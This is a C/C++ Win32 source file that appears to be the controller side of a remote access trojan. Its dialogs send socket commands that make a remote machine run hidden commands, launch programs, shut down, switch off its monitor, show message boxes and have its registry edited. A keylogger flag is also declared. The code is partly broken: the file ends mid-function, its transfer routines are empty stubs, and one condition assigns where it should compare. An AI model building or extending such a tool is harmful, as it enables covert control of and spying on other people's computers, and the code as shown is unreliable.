#include "procs.h"

BOOL g_bRet = FALSE;    // for check() thread
BOOL g_bKeyed = FALSE;  // for keylogger
BOOL g_bChat = FALSE;   // for chat

//! TODO: add control sizing and corner grabbing

void cleanup()
{
    closesocket(sockConnect);
    WSACleanup();
}

int download(LPCSTR lpFile)
{

    return 0;
}

int upload(LPCSTR lpFile)
{

    return 0;
}

/*BOOL check()
{
    packet_t packet;
    int iRet = 0;

    iRet = recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    if(iRet > 0)
    {
        if(packet.type == PACKET_RET)
        {
            if(packet.iBuf)
                return TRUE;
            else
                return FALSE;
        }
    }

    return FALSE;
}*/

//----------------------------------------------------------------
/* Checking for functions' success */
DWORD WINAPI _check(LPVOID lpBuffer)
{
    packet_t packet;
    int iRet = 0;

    iRet = recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    if(iRet > 0)
    {
        if(packet.type == PACKET_RET)
        {
            if(packet.iBuf)
                g_bRet = TRUE;
            else
                g_bRet = FALSE;
        }
    }

    ExitThread(0);
}
BOOL check()
{
    BOOL bRet = FALSE;
    g_bRet = FALSE;
    HANDLE hThread =
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_check, NULL, 0, 0);

    if(hThread == NULL)
        return FALSE;

    Sleep(50);

    if(g_bRet)
    {
        bRet = TRUE;
        CloseHandle(hThread);
        g_bRet = FALSE;
        return bRet;
    }

    Sleep(500);
    if(g_bRet)
        bRet = TRUE;

    CloseHandle(hThread);
    return bRet;
}

//----------------------------------------------------------------
/* Send Message Box */
DWORD WINAPI _retrieve_result(LPVOID lpBuffer)
{
    packet_t packet;
    int iRes = 0;

    /* confirm correct data */
    for(;;)
    {
        Sleep(5);
        iRes = recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
        if(packet.type == PACKET_MSG_RES)
        {
            char buf[256];
            sprintf(buf, "User clicked \"%s\"", packet.data);
            MessageBox(NULL, buf, "User Message", MB_OK | MB_ICONINFORMATION);
            break;
        }
    }

    ExitThread(0);
}
BOOL CALLBACK DlgMsgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditMessage       = GetDlgItem(hwnd, DLG_MSG_IDC_EDT_MSG);
    HWND hEditTitle         = GetDlgItem(hwnd, DLG_MSG_IDC_EDT_TITLE);
    HWND hComboType         = GetDlgItem(hwnd, DLG_MSG_IDC_CMB_TYPE);
    HWND hComboIcon         = GetDlgItem(hwnd, DLG_MSG_IDC_CMB_ICON);

    static checkbox_t result;
    result.hWnd = GetDlgItem(hwnd, DLG_MSG_IDC_CHK_RESULT);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_MSG] = hwnd;
            SetWindowText(hEditTitle, "Message");
            result.bChecked = FALSE;

            CBAddString(hComboType, "OK");
            CBAddString(hComboType, "YES/NO");

            CBAddString(hComboIcon, "None");
            CBAddString(hComboIcon, "Warning");
            CBAddString(hComboIcon, "Stop");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_MSG_IDC_CHK_RESULT:
                    if(result.bChecked)
                    {
                        SendMessage(result.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        result.bChecked = FALSE;
                    }
                    else
                    {
                        SendMessage(result.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        result.bChecked = TRUE;
                    }
                    break;

                case DLG_MSG_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_MSG;
                        int len = 0;

                        len = GetWindowTextLength(hEditMessage);
                        if(len <= 0){
                            ErrMsg("Enter a message");
                            break;
                        }
                        GetWindowText(hEditMessage, packet.data, len + 1);

                        len = GetWindowTextLength(hEditTitle);
                        if(len <= 0){
                            ErrMsg("Enter a title");
                            break;
                        }
                        GetWindowText(hEditTitle, packet.buf, len + 1);
                        for(int i=0; i<len; ++i) // make sure the title is a single word
                        {
                            if(packet.buf[i] == ' ')
                            {
                                ErrMsg("The title must be a single word");
                                break;
                            }
                        }

                        GetWindowText(hComboType, packet.buf2, sizeof(packet.buf2));
                        GetWindowText(hComboIcon, packet.buf3, sizeof(packet.buf3));

                        if(result.bChecked)
                            packet.iBuf = TRUE;
                        else
                            packet.iBuf = FALSE;

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("MessageBox sent.");
                        else
                            SetStatusBar("MessageBox failed.");

                        if(result.bChecked) // retrieve the result
                        {
                            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_retrieve_result, 0, 0, 0);
                            break;
                        }
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_MSG] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Beep Procedure */
BOOL CALLBACK DlgBeepProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditFreq          = GetDlgItem(hwnd, DLG_BEEP_IDC_EDT_FREQ);
    HWND hEditDur           = GetDlgItem(hwnd, DLG_BEEP_IDC_EDT_DUR);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_BEEP] = hwnd;
            SetWindowText(hEditFreq, "900");
            SetWindowText(hEditDur, "1000");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_BEEP_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_BEEP;
                        char szFreq[32], szDur[32];
                        int len = 0;

                        len = GetWindowTextLength(hEditFreq);
                        if(len <= 0){
                            ErrMsg("Enter frequency");
                            break;
                        }
                        GetWindowText(hEditFreq, szFreq, len + 1);

                        len = GetWindowTextLength(hEditDur);
                        if(len <= 0){
                            ErrMsg("Enter duration");
                            break;
                        }
                        GetWindowText(hEditDur, szDur, len + 1);

                        sprintf(packet.data, "%s %s", szFreq, szDur);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("Beep successful.");
                        else
                            SetStatusBar("Beep failed.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_BEEP] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Command Prompt Procedure */
BOOL CALLBACK DlgCmdProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditCmd           = GetDlgItem(hwnd, DLG_CMD_IDC_EDT_CMD);

    static checkbox_t hide, pause;
    hide.hWnd = GetDlgItem(hwnd, DLG_CMD_IDC_CHK_HIDE);
    pause.hWnd = GetDlgItem(hwnd, DLG_CMD_IDC_CHK_PAUSE);

    if(hide.bChecked){
        EnableWindow(pause.hWnd, false);
        SendMessage(pause.hWnd, BM_SETCHECK, (WPARAM)0, 0);
    }
    else
        EnableWindow(pause.hWnd, true);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_CMD] = hwnd;
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_CMD_IDC_CHK_HIDE:
                    if(hide.bChecked)
                    {
                        SendMessage(hide.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        hide.bChecked = FALSE;
                    }
                    else
                    {
                        SendMessage(hide.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        hide.bChecked = TRUE;
                    }
                    break;

                case DLG_CMD_IDC_CHK_PAUSE:
                    if(pause.bChecked)
                    {
                        SendMessage(pause.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        pause.bChecked = FALSE;
                    }
                    else
                    {
                        SendMessage(pause.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        pause.bChecked = TRUE;
                    }
                    break;

                case DLG_CMD_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_CMD;
                        int len = 0;

                        len = GetWindowTextLength(hEditCmd);
                        if(len <= 0){
                            ErrMsg("Enter a command");
                            break;
                        }
                        GetWindowText(hEditCmd, packet.buf, len + 1);

                        sprintf(packet.data, "%d %d", hide.bChecked, pause.bChecked);
                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("Command executed successfully.");
                        else
                            SetStatusBar("Failed to execute command.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_CMD] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Run Procedure */
BOOL CALLBACK DlgRunProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditRun = GetDlgItem(hwnd, DLG_RUN_IDC_EDT_RUN);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_RUN] = hwnd;
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_RUN_IDC_BTN_RUN:
                    packet_t packet;
                    packet.type = PACKET_RUN;
                    int len = 0;

                    len = GetWindowTextLength(hEditRun);
                    if(len <= 0)
                    {
                        ErrMsg("Enter a query");
                        break;
                    }
                    GetWindowText(hEditRun, packet.data, len + 1);

                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Run successful.");
                    else
                        SetStatusBar("Run failed.");

                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_RUN] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Shutdown/Restart/Logoff Procedure */
BOOL CALLBACK DlgShutdownProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditTime      = GetDlgItem(hwnd, DLG_SHUTDOWN_IDC_EDT_TIME);
    HWND hEditReason    = GetDlgItem(hwnd, DLG_SHUTDOWN_IDC_EDT_REASON);

    static checkbox_t down, res, log;
    down.hWnd = GetDlgItem(hwnd, DLG_SHUTDOWN_IDC_RDO_DOWN);
    res.hWnd  = GetDlgItem(hwnd, DLG_SHUTDOWN_IDC_RDO_RES);
    log.hWnd  = GetDlgItem(hwnd, DLG_SHUTDOWN_IDC_RDO_LOGOFF);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_SDOWN] = hwnd;
            down.bChecked = TRUE;
            SendMessage(down.hWnd, BM_SETCHECK, (WPARAM)1, 0);
            res.bChecked = FALSE;
            log.bChecked = FALSE;
            SetWindowText(hEditTime, "00");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_SHUTDOWN_IDC_RDO_DOWN:
                    if(!down.bChecked)
                    {
                        down.bChecked = TRUE;
                        SendMessage(down.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        res.bChecked = FALSE;
                        SendMessage(res.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        log.bChecked = FALSE;
                        SendMessage(log.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                    }
                    break;

                case DLG_SHUTDOWN_IDC_RDO_RES:
                    if(!res.bChecked)
                    {
                        down.bChecked = FALSE;
                        SendMessage(down.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        res.bChecked = TRUE;
                        SendMessage(res.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        log.bChecked = FALSE;
                        SendMessage(log.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                    }
                    break;

                case DLG_SHUTDOWN_IDC_RDO_LOGOFF:
                    if(!log.bChecked)
                    {
                        down.bChecked = FALSE;
                        SendMessage(down.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        res.bChecked = FALSE;
                        SendMessage(res.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                        log.bChecked = TRUE;
                        SendMessage(log.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                    }
                    break;

                case DLG_SHUTDOWN_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_SDOWN;
                        packet.iBuf = FALSE;
                        int len = 0;

                        if(down.bChecked)
                            sprintf(packet.buf, "-s");
                        else if(res.bChecked)
                            sprintf(packet.buf, "-r");
                        else if(log.bChecked)
                            sprintf(packet.buf, "-l");

                        len = GetWindowTextLength(hEditTime);
                        if(len <= 0)
                        {
                            ErrMsg("Enter a time");
                            break;
                        }
                        GetWindowText(hEditTime, packet.buf2, len + 1);


                        len = GetWindowTextLength(hEditReason);
                        if(len > 0)
                        {
                            packet.iBuf = TRUE;
                            GetWindowText(hEditReason, packet.buf3, len + 1);
                        }

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("Shutdown successful.");
                        else
                            SetStatusBar("Shutdown failed.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_SDOWN] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Power Monitor On/Off Procedure */
BOOL CALLBACK DlgMonitorProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditTimes     = GetDlgItem(hwnd, DLG_MON_IDC_EDT_TIMES);
    HWND hEditSeconds   = GetDlgItem(hwnd, DLG_MON_IDC_EDT_SECONDS);
    HWND hEditInterval  = GetDlgItem(hwnd, DLG_MON_IDC_EDT_INTERVAL);

    static checkbox_t off, on;
    off.hWnd = GetDlgItem(hwnd, DLG_MON_IDC_RDO_OFF);
    on.hWnd  = GetDlgItem(hwnd, DLG_MON_IDC_RDO_ON);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_MON] = hwnd;
            off.bChecked = TRUE;
            SendMessage(off.hWnd, BM_SETCHECK, (WPARAM)1, 0);
            on.bChecked = FALSE;
            SetWindowText(hEditTimes, "1");
            SetWindowText(hEditSeconds, "1");
            SetWindowText(hEditInterval, "0");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_MON_IDC_RDO_OFF:
                    if(!off.bChecked)
                    {
                        off.bChecked = TRUE;
                        SendMessage(off.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        on.bChecked = FALSE;
                        SendMessage(on.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                    }
                    break;

                case DLG_MON_IDC_RDO_ON:
                    if(!on.bChecked)
                    {
                        on.bChecked = TRUE;
                        SendMessage(on.hWnd, BM_SETCHECK, (WPARAM)1, 0);
                        off.bChecked = FALSE;
                        SendMessage(off.hWnd, BM_SETCHECK, (WPARAM)0, 0);
                    }
                    break;

                case DLG_MON_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_MON;
                        char szTimes[32], szSeconds[32], szInterval[32];
                        int len = 0;

                        if(off.bChecked)
                            packet.iBuf = TRUE;
                        else
                            packet.iBuf = FALSE;

                        len = GetWindowTextLength(hEditTimes);
                        if(len <= 0)
                        {
                            ErrMsg("Enter number of times");
                            break;
                        }
                        GetWindowText(hEditTimes, szTimes, len + 1);

                        len = GetWindowTextLength(hEditSeconds);
                        if(len <= 0)
                        {
                            ErrMsg("Enter number of seconds");
                            break;
                        }
                        GetWindowText(hEditSeconds, szSeconds, len + 1);

                        len = GetWindowTextLength(hEditInterval);
                        if(len <= 0)
                        {
                            ErrMsg("Enter interval");
                            break;
                        }
                        GetWindowText(hEditInterval, szInterval, len + 1);

                        sprintf(packet.data, "%s %s %s", szTimes, szSeconds, szInterval);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("Monitor power-change successful.");
                        else
                            SetStatusBar("Monitor power-change failed.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_MON] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Registry Procedure */
void recv_load_key()
{
    packet_t packet;
    int nValues = 0;

    int iRes = recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    if(iRes > 0)
    {
        if(packet.type == REG_LOADKEY)
            SetStatusBar(packet.data);

        if(packet.iBuf != TRUE)
            return;
    }

    /* recv number of values */
    iRes = recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    if(iRes > 0)
    {
        if(packet.type == REG_LOADKEY)
            nValues = packet.iBuf;
    }

    SendDlgItemMessage(hWindows[HWND_REG], DLG_REG_IDC_LST_VALUES, LB_RESETCONTENT, 0, 0);
    for(int i=0; i<nValues; ++i)
    {
        recv(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
        LBAddString(hWindows[HWND_REG], DLG_REG_IDC_LST_VALUES, packet.data);
    }

}
void load_details()
{
    HWND hCmbHive       = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_CMB_HIVE);
    HWND hEditKey       = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_KEY);
    packet_t packet, recvpacket;
    regval_t regval;

    packet.type = PACKET_REG;
    packet.iBuf = REG_DETAILS;

    /* let the server know it's handling a details message */
    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

    int len = GetWindowTextLength(hCmbHive);
    if(len <= 0)
    {
        ErrMsg("Select a hive");
        return;
    }

    /* Assign the hive value */
    regval.nKey = SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);

    len = GetWindowTextLength(hEditKey);
    if(len <= 0)
    {
        ErrMsg("Enter a sub-key");
        return;
    }
    GetWindowText(hEditKey, regval.szSubKey, len + 1);

    send(sockConnect, (LPSTR)&regval, sizeof(regval_t), 0);
    int iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
    if(iRes > 0)
    {
        SetStatusBar(recvpacket.data);
        if(recvpacket.iBuf != TRUE)
            return;
    }
    else
    {
        ErrMsg("Error receiving data");
        return;
    }

    /* send the value to enumerate */
    DWORD dwSelection = SendDlgItemMessage(hWindows[HWND_REG],
                                            DLG_REG_IDC_LST_VALUES,
                                            LB_GETCURSEL,
                                            0, 0);
    if((signed int)dwSelection != LB_ERR)
    {
        SendDlgItemMessage(hWindows[HWND_REG], DLG_REG_IDC_LST_VALUES, LB_GETTEXT,
            (WPARAM)dwSelection, (LPARAM)(LPSTR)packet.data);
    }

    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

    /* receive the enumerated data */
    recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
    if(recvpacket.type = REG_DETAILS && recvpacket.iBuf == TRUE)
    {
        HWND hEditType = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_TYPE);
        HWND hEditData = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_DATA);
        DWORD dwType = 0;

        sscanf(recvpacket.buf, "%ld", &dwType); // get the value type

        SetWindowText(hEditType,   (dwType == 1) ? "REG_SZ"
                                 : (dwType == 2) ? "REG_EXPAND_SZ"
                                 : (dwType == 3) ? "REG_BINARY"
                                 : (dwType == 4) ? "REG_DWORD"
                                 : (dwType == 5) ? "REG_DWORD_BIG_ENDIAN"
                                 : (dwType == 6) ? "REG_LINK"
                                 : (dwType == 7) ? "REG_MULTI_SZ"
                                 : (dwType == 8) ? "REG_RESOURCE_LIST"
                                 : (dwType == 9) ? "REG_FULL_RESOURCE_DESCRIPTOR"
                                 : (dwType == 10) ? "REG_RESOURCE_REQUIREMENTS_LIST"
                                 : (dwType == 11) ? "REG_QWORD" : "");
        SetWindowText(hEditData, (LPSTR)recvpacket.data);
    }
    else if(recvpacket.type == REG_DETAILS && recvpacket.iBuf == FALSE)
        ErrMsg("Error querying value");
    else
        ErrMsg("Error receiving correct packet");
}
void edit_value() // (Apply Changes button)
{
    packet_t packet, recvpacket;
    regval_t regval;
    HWND hCmbHive       = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_CMB_HIVE);
    HWND hEditSubKey    = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_KEY);
    HWND hEditType      = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_TYPE);
    HWND hEditValue     = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_DATA);
    int len = 0;

    /* tell server it's handling an edit_value request */
    packet.type = PACKET_REG;
    packet.iBuf = REG_EDITVALUE;
    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    packet.iBuf = 0; // clear for future use

    /* Get the hive */
    regval.nKey = (int)SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);

    /* Get the sub-key */
    len = GetWindowTextLength(hEditSubKey);
    if(len <= 0)
    {
        ErrMsg("Load a value (enter sub-key)");
        return;
    }
    GetWindowText(hEditSubKey, regval.szSubKey, len + 1);

    /* Get the value type */
    len = GetWindowTextLength(hEditType);
    if(len > 0)
    {
        char szBuffer[len + 1];
        GetWindowText(hEditType, szBuffer, len + 1);

        if(strcmp(szBuffer, "REG_SZ") == 0)                                 packet.iBuf = 0;
        else if(strcmp(szBuffer, "REG_EXPAND_SZ") == 0)                     packet.iBuf = 1;
        else if(strcmp(szBuffer, "REG_DWORD") == 0)                         packet.iBuf = 2;
        else if(strcmp(szBuffer, "REG_DWORD_BIG_ENDIAN") == 0)              packet.iBuf = 3;
        else if(strcmp(szBuffer, "REG_LINK") == 0)                          packet.iBuf = 4;
        else if(strcmp(szBuffer, "REG_MULTI_SZ") == 0)                      packet.iBuf = 5;
        else if(strcmp(szBuffer, "REG_RESOURCE_LIST") == 0)                 packet.iBuf = 6;
        else if(strcmp(szBuffer, "REG_FULL_RESOURCE_DESCRIPTOR") == 0)      packet.iBuf = 7;
        else if(strcmp(szBuffer, "REG_RESOURCE_REQUIREMENTS_LIST") == 0)    packet.iBuf = 8;
        else if(strcmp(szBuffer, "REG_QWORD") == 0)                         packet.iBuf = 9;
        else packet.iBuf = 0;
    }
    else
    {
        ErrMsg("Load a value");
        return;
    }

    /* and send the value type */
    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

    /* Get the value data */
    len = GetWindowTextLength(hEditValue);
    if(len <= 0)
    {
        ErrMsg("Enter the value to change");
        return;
    }
    GetWindowText(hEditValue, packet.data, len + 1);

}
void add_value()
{
    packet_t packet, recvpacket;
    regval_t regval;
    HWND hCmbHive       = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_CMB_ADDHIVE);
    HWND hCmbType       = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_CMB_ADDTYPE);
    HWND hEditSubKey    = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_ADDSUBKEY);
    HWND hEditName      = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_ADDNAME);
    HWND hEditValue     = GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_ADDVAL);
    int len = 0;
    DWORD dwType = 0;

    len = GetWindowTextLength(hEditSubKey);
    if(len <= 0)
    {
        ErrMsg("Enter a sub-key to add");
        return;
    }
    GetWindowText(hEditSubKey, regval.szSubKey, len + 1);

    len = GetWindowTextLength(hEditValue);
    if(len <= 0)
    {
        ErrMsg("Enter a value");
        return;
    }
    GetWindowText(hEditValue, (LPSTR)packet.data, len + 1);

    /* tell the server it's handling an add-value command */
    packet.type = PACKET_REG;
    packet.iBuf = REG_ADDVALUE;
    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
    packet.iBuf = 0; // prepare for next send()

    /* send the type */
    packet_t* tpacket = new packet_t,
            * vpacket = new packet_t;
    tpacket->type = PACKET_REG;
    vpacket->type = PACKET_REG;
    tpacket->iBuf = (int)SendMessage(hCmbType, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);
    if(tpacket->iBuf == 2 || tpacket->iBuf == 3 || tpacket->iBuf == 9)
        vpacket->iBuf = 1;
    else
        vpacket->iBuf = 0;

    send(sockConnect, (LPSTR)tpacket, sizeof(packet_t), 0);
    delete tpacket; tpacket = 0;

    /* send the value */
    send(sockConnect, (LPSTR)vpacket, sizeof(packet_t), 0);
    delete vpacket; vpacket = 0;

    len = GetWindowTextLength(hEditName);
    if(len <= 0)
    {
        ErrMsg("Enter a name");
        return;
    }
    GetWindowText(hEditName, packet.data, len + 1);

    /* Assign the hive value */
    regval.nKey = (int)SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);

    send(sockConnect, (LPSTR)&regval, sizeof(regval_t), 0);
    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

    recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
    if(recvpacket.iBuf)
        SetStatusBar("Registry value created and/or set");
    else
        SetStatusBar("Failed to create/set registry value");

    /* Set the load key information the same as the add key information */
    char szBuffer[MAX_PATH] = {0};
    int nSelection = (int)SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);
    SendMessage(GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_CMB_HIVE), CB_SETCURSEL, (WPARAM)nSelection, (LPARAM)0);
    len = GetWindowTextLength(hEditSubKey);
    GetWindowText(hEditSubKey, szBuffer, len + 1);
    SetWindowText(GetDlgItem(hWindows[HWND_REG], DLG_REG_IDC_EDT_KEY), szBuffer);

    /* Simulate "Load" button click to update the list box */
    SendMessage(hWindows[HWND_REG], WM_COMMAND, MAKEWPARAM(DLG_REG_IDC_BTN_QUERY, BN_CLICKED), (LPARAM)0);
}
BOOL CALLBACK DlgRegProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    const char* szHives[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE",
                             "HKEY_USERS", "HKEY_CURRENT_CONFIG", "HKEY_PERFORMANCE_DATA", 0};
    const char* szTypes[] = {"REG_SZ", "REG_EXPAND_SZ", "REG_DWORD", "REG_DWORD_BIG_ENDIAN",
                             "REG_LINK", "REG_MULTI_SZ", "REG_RESOURCE_LIST",
                             "REG_FULL_RESOURCE_DESCRIPTOR", "REG_RESOURCE_REQUIREMENTS_LIST",
                             "REG_QWORD", 0};

    HWND hCmbHive       = GetDlgItem(hwnd, DLG_REG_IDC_CMB_HIVE);
    HWND hCmbAddHive    = GetDlgItem(hwnd, DLG_REG_IDC_CMB_ADDHIVE);
    HWND hCmbAddType    = GetDlgItem(hwnd, DLG_REG_IDC_CMB_ADDTYPE);
    HWND hEditKey       = GetDlgItem(hwnd, DLG_REG_IDC_EDT_KEY);
    int len = 0;

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_REG] = hwnd;
            for(int i=0; i<6; ++i)
            {
                CBAddString(hCmbHive, szHives[i]);
                CBAddString(hCmbAddHive, szHives[i]);
            }

            for(int i=0; i<10; ++i)
                CBAddString(hCmbAddType, szTypes[i]);
            SendMessage(hCmbAddType, CB_SETCURSEL, 0, 0);

            /* set the default selection for combo boxes */
            for(int i=0; i<2; ++i)
                SendMessage((i == 0) ? hCmbHive : hCmbAddHive, CB_SETCURSEL, 0, 0);
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_REG_IDC_LST_VALUES:
                    switch(HIWORD(wParam))
                    {
                        case LBN_SELCHANGE:
                            load_details();
                            break;
                    }
                    break;

                case DLG_REG_IDC_BTN_QUERY:
                    {
                        packet_t packet;
                        packet.type = PACKET_REG;
                        packet.iBuf = REG_LOADKEY;
                        regval_t regval;

                        len = GetWindowTextLength(hCmbHive);
                        if(len <= 0)
                        {
                            ErrMsg("Select a hive");
                            break;
                        }

                        /* Assign the hive value */
                        regval.nKey = SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);

                        len = GetWindowTextLength(hEditKey);
                        if(len <= 0)
                        {
                            ErrMsg("Enter a sub-key");
                            break;
                        }
                        GetWindowText(hEditKey, regval.szSubKey, len + 1);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                        send(sockConnect, (LPSTR)&regval, sizeof(regval_t), 0);
                        recv_load_key();
                    }
                    break;

                case DLG_REG_IDC_BTN_ADD:
                    {
                        add_value();
                    }
                    break;

                case DLG_REG_IDC_BTN_DELVAL:
                    {
                        packet_t packet, recvpacket;
                        regval_t regval;

                        packet.type = PACKET_REG;
                        packet.iBuf = REG_DELVALUE;

                        /* Assign the hive value */
                        regval.nKey = SendMessage(hCmbHive, CB_GETCURSEL, (WPARAM)0, (LPARAM)0);

                        len = GetWindowTextLength(hEditKey);
                        if(len <= 0)
                        {
                            ErrMsg("Enter the corresponding sub-key");
                            break;
                        }
                        GetWindowText(hEditKey, regval.szSubKey, len + 1);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                        send(sockConnect, (LPSTR)&regval, sizeof(regval_t), 0);

                        /* verify key is open */
                        int iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                        if(iRes > 0)
                        {
                            if(recvpacket.type == REG_DELVALUE)
                            {
                                SetStatusBar(recvpacket.data);
                                if(recvpacket.iBuf != TRUE)
                                    break;
                            }
                        }
                        else
                        {
                            ErrMsg("Error receiving data");
                            break;
                        }

                        DWORD dwSelection = SendDlgItemMessage(hwnd,
                                                               DLG_REG_IDC_LST_VALUES,
                                                               LB_GETCURSEL,
                                                               0, 0);
                        if((signed int)dwSelection != LB_ERR)
                        {
                            SendDlgItemMessage(hwnd, DLG_REG_IDC_LST_VALUES, LB_GETTEXT,
                                                (WPARAM)dwSelection, (LPARAM)(LPSTR)packet.data);
                        }
                        else
                        {
                            ErrMsg("Error retrieving selected value");
                            break;
                        }
                        packet.type = REG_DELVALUE;
